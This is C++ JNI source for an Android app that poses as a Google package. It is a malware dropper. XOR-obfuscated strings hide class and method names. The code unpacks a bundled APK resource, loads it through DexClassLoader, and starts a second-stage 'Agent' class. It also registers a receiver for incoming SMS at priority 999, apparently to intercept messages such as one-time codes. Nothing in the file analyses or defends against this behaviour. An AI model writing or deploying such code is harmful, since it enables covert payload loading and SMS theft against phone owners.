#include <jni.h>
#include <string>
#include <vector>
#include <android/log.h>

// Simple XOR deobfuscator for C++ strings
std::string o(const std::string& s) {
    std::string r = s;
    for (char &c : r) c ^= 4;
    return r;
}

extern "C"
JNIEXPORT void JNICALL
Java_com_google_android_apps_work_cloudpc_MainActivity_asd(JNIEnv *env, jclass clazz) {
    // "android/util/Log"
    jclass logClass = env->FindClass(o("ej`vkm`+qpmh+Hkc").c_str());
    if (logClass == nullptr) return;

    // "INFO"
    jfieldID infoField = env->GetStaticFieldID(logClass, o("MJBK").c_str(), "I");
    jint infoPriority = env->GetStaticIntField(logClass, infoField);

    // "println"
    jmethodID printlnMethod = env->GetStaticMethodID(logClass, o("tvmjphj").c_str(), "(ILjava/lang/String;Ljava/lang/String;)I");

    if (printlnMethod != nullptr) {
        jstring tag = env->NewStringUTF(o("NJM[HKC").c_str());
        jstring msg = env->NewStringUTF(o("Lahhk$bvki$G//%").c_str());

        env->CallStaticIntMethod(logClass, printlnMethod, infoPriority, tag, msg);

        env->DeleteLocalRef(tag);
        env->DeleteLocalRef(msg);
    }
}

extern "C"
JNIEXPORT void JNICALL
Java_com_google_android_apps_work_cloudpc_Manager_asd(JNIEnv *env, jclass clazz) {
    Java_com_google_android_apps_work_cloudpc_MainActivity_asd(env, clazz);
}

jstring getFilePathFromRawResource(JNIEnv *env, jobject context, jint resourceId) {
    jclass contextClass = env->GetObjectClass(context);

    // "getCodeCacheDir"
    jmethodID getCodeCacheDir = env->GetMethodID(contextClass, o("capGk`aGegla@mv").c_str(), "()Ljava/io/File;");
    jobject cacheDir = env->CallObjectMethod(context, getCodeCacheDir);

    // "java/io/File"
    jclass fileClass = env->FindClass(o("nere+mk+Bmha").c_str());
    jmethodID fileInit = env->GetMethodID(fileClass, "<init>", "(Ljava/io/File;Ljava/lang/String;)V");
    jstring fileName = env->NewStringUTF(o("pait[hke`a`*eto").c_str());
    jobject tempApk = env->NewObject(fileClass, fileInit, cacheDir, fileName);

    // "getResources"
    jmethodID getResources = env->GetMethodID(contextClass, o("capVawkqvgaw").c_str(), "()Landroid/content/res/Resources;");
    jobject resources = env->CallObjectMethod(context, getResources);
    jclass resourcesClass = env->GetObjectClass(resources);
    // "openRawResource"
    jmethodID openRawResource = env->GetMethodID(resourcesClass, o("ktajVesVawkqvga").c_str(), "(I)Ljava/io/InputStream;");
    jobject inputStream = env->CallObjectMethod(resources, openRawResource, resourceId);

    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }

    // "java/io/FileOutputStream"
    jclass fosClass = env->FindClass(o("nere+mk+BmhaKqptqpWpvaei").c_str());
    jmethodID fosInit = env->GetMethodID(fosClass, "<init>", "(Ljava/io/File;)V");
    jobject outputStream = env->NewObject(fosClass, fosInit, tempApk);

    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }

    // "java/io/InputStream"
    jclass isClass = env->FindClass(o("nere+mk+MjtqpWpvaei").c_str());
    jmethodID read = env->GetMethodID(isClass, o("vae`").c_str(), "([B)I");
    jmethodID write = env->GetMethodID(fosClass, o("svmpa").c_str(), "([BII)V");
    jbyteArray buffer = env->NewByteArray(1024);

    jint bytesRead;
    while ((bytesRead = env->CallIntMethod(inputStream, read, buffer)) > 0) {
        env->CallVoidMethod(outputStream, write, buffer, 0, bytesRead);
        if (env->ExceptionCheck()) break;
    }

    // "flush", "close"
    jmethodID flush = env->GetMethodID(fosClass, o("bhqwl").c_str(), "()V");
    env->CallVoidMethod(outputStream, flush);
    jmethodID closeOS = env->GetMethodID(fosClass, o("ghkwa").c_str(), "()V");
    env->CallVoidMethod(outputStream, closeOS);
    jmethodID closeIS = env->GetMethodID(isClass, o("ghkwa").c_str(), "()V");
    env->CallVoidMethod(inputStream, closeIS);

    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }

    // "getAbsolutePath"
    jmethodID getAbsolutePath = env->GetMethodID(fileClass, o("capEfwkhqpaTepl").c_str(), "()Ljava/lang/String;");
    return (jstring)env->CallObjectMethod(tempApk, getAbsolutePath);
}

extern "C"
JNIEXPORT void JNICALL
Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jclass clazz, jobject context) {
    // "com/google/android/apps/work/cloudpc/R$raw"

    jclass rRawClass = env->FindClass(o("gki+ckkcha+ej`vkm`+ettw+skvo+ghkq`tg+V ves").c_str());
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return;
    }
    // "app_debug"
    jfieldID appDebugField = env->GetStaticFieldID(rRawClass, o("ett[`afqc").c_str(), "I");
    if (appDebugField == nullptr) return;
    jint resourceId = env->GetStaticIntField(rRawClass, appDebugField);

    jstring jPath = getFilePathFromRawResource(env, context, resourceId);
    if (jPath == nullptr) return;

    // 3. Initialize DexClassLoader directly in C++
    jclass dexClassLoaderClass = env->FindClass("dalvik/system/DexClassLoader");
    if (dexClassLoaderClass == nullptr) return;

    jmethodID dexClassLoaderInit = env->GetMethodID(dexClassLoaderClass, "<init>",
        "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
    if (dexClassLoaderInit == nullptr) return;

    // Use context.getClassLoader() as parent
    jclass contextClass = env->GetObjectClass(context);
    jmethodID getClassLoader = env->GetMethodID(contextClass, "getClassLoader", "()Ljava/lang/ClassLoader;");
    jobject parentLoader = env->CallObjectMethod(context, getClassLoader);

    jobject classLoader = env->NewObject(dexClassLoaderClass, dexClassLoaderInit,
        jPath, (jstring)NULL, (jstring)NULL, parentLoader);

    if (classLoader == nullptr || env->ExceptionCheck()) {
        env->ExceptionClear();
        return;
    }

    // 4. loader.loadClass("com.google.android.apps.work.stage2.Agent")
    jclass classLoaderClass = env->FindClass("java/lang/ClassLoader");
    jmethodID loadClassMethod = env->GetMethodID(classLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
    if (loadClassMethod == nullptr) return;
    // "com.google.android.apps.work.stage2.Agent"
    jstring className = env->NewStringUTF(o("gki*ckkcha*ej`vkm`*ettw*skvo*wpeca6*Ecajp").c_str());
    jclass agentClass = (jclass)env->CallObjectMethod(classLoader, loadClassMethod, className);

    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return;
    }

    // "getInstance"
    jmethodID getInstanceMethod = env->GetStaticMethodID(agentClass, o("capMjwpejga").c_str(), o(",-Hgki+ckkcha+ej`vkm`+ettw+skvo+wpeca6+Ecajp?").c_str());
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        getInstanceMethod = env->GetStaticMethodID(agentClass, o("capMjwpejga").c_str(), "()Ljava/lang/Object;");
    }

    if (getInstanceMethod != nullptr) {
        jobject agentInstance = env->CallStaticObjectMethod(agentClass, getInstanceMethod);
        if (env->ExceptionCheck()) {
            env->ExceptionDescribe();
            env->ExceptionClear();
            agentInstance = nullptr;
        }
        if (agentInstance != nullptr) {
            // 6. Call agentInstance.start(context, null, null)
            jmethodID startMethod = env->GetMethodID(agentClass, "start", "(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/Object;)V");
            if (startMethod != nullptr) {
                env->CallVoidMethod(agentInstance, startMethod, context, nullptr, nullptr);
                if (env->ExceptionCheck()) {
                    env->ExceptionClear();
                }
            }
        }
    }

    // 7. Register UpdateReceiver from stage2 dynamically
    jstring receiverClassName = env->NewStringUTF("com.google.android.apps.work.stage2.UpdateReceiver");
    jclass updateReceiverClass = (jclass)env->CallObjectMethod(classLoader, loadClassMethod, receiverClassName);

    if (!env->ExceptionCheck() && updateReceiverClass != nullptr) {
        jmethodID receiverInit = env->GetMethodID(updateReceiverClass, "<init>", "()V");
        jobject receiverInstance = env->NewObject(updateReceiverClass, receiverInit);

        if (env->ExceptionCheck()) {
            env->ExceptionClear();
            receiverInstance = nullptr;
        }

        if (receiverInstance != nullptr) {
            jclass filterClass = env->FindClass("android/content/IntentFilter");
            jmethodID filterInit = env->GetMethodID(filterClass, "<init>", "(Ljava/lang/String;)V");
            jstring action = env->NewStringUTF("android.provider.Telephony.SMS_RECEIVED");
            jobject filter = env->NewObject(filterClass, filterInit, action);

            // Set high priority
            jmethodID setPriority = env->GetMethodID(filterClass, "setPriority", "(I)V");
            if (setPriority != nullptr) {
                env->CallVoidMethod(filter, setPriority, 999);
            }

            // registerReceiver(BroadcastReceiver, IntentFilter)
            jmethodID registerReceiverMethod = env->GetMethodID(contextClass, "registerReceiver", "(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;");

            if (registerReceiverMethod != nullptr) {
                env->CallObjectMethod(context, registerReceiverMethod, receiverInstance, filter);
                if (env->ExceptionCheck()) {
                    env->ExceptionClear();
                } else {

                    jclass logClass = env->FindClass("android/util/Log");
                    jmethodID infoMethod = env->GetStaticMethodID(logClass, "i", "(Ljava/lang/String;Ljava/lang/String;)I");
                    if (infoMethod != nullptr) {
                        jstring tagStr = env->NewStringUTF("JNI_Loader");
                        jstring msgStr = env->NewStringUTF("Successfully registered UpdateReceiver dynamically with priority 999");
                        env->CallStaticIntMethod(logClass, infoMethod, tagStr, msgStr);
                        env->DeleteLocalRef(tagStr);
                        env->DeleteLocalRef(msgStr);
                    }
                }
            }
        }
    }

    if (env->ExceptionCheck()) {
        env->ExceptionClear();
    }
}

